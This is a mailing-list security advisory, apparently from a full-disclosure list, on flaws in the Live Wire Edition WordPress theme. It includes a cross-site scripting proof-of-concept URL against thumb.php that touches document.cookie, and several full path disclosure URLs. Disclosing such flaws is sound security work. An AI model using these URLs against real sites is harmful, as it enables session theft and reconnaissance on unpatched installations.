Hello list!

I want to warn you about Cross-Site Scripting, Full path disclosure, Abuse
of Functionality and Denial of Service vulnerabilities in Live Wire Edition
theme for WordPress. It's commercial theme for WP by WooThemes.

-------------------------
Affected products:
-------------------------

Vulnerable are Live Wire Edition 2.3.1 and previous versions. XSS is
possible only in old versions of the theme. Recently in version Live Wire
Edition 2.4 most of these vulnerabilities were fixed (but there were still
left many not fixed FPD).

Details:

XSS (WASC-08):

http://site/wp-content/themes/livewire-edition/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg

Full path disclosure (WASC-13):

http://site/wp-content/themes/livewire-edition/thumb.php?src=jpg

http://site/wp-content/themes/livewire-edition/thumb.php?src=http://site/page.png&h=1&w=1111111

http://site/wp-content/themes/livewire-edition/thumb.php?src=http://site/page.png&h=1111111&w=1

http://site/wp-content/themes/livewire-edition/

And also other 30 php-scripts of the theme in folder /livewire-edition/ and
all subfolders.

Abuse of Functionality (WASC-42):

DoS (WASC-10):

About such AoF and DoS vulnerabilities I wrote in article Using of the sites
for attacks on other sites
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-June/075384.html).

Beside folder /livewire-edition/, this theme also can be placed in folder
/livewire-package/ (which includes all three themes of Live Wire series).
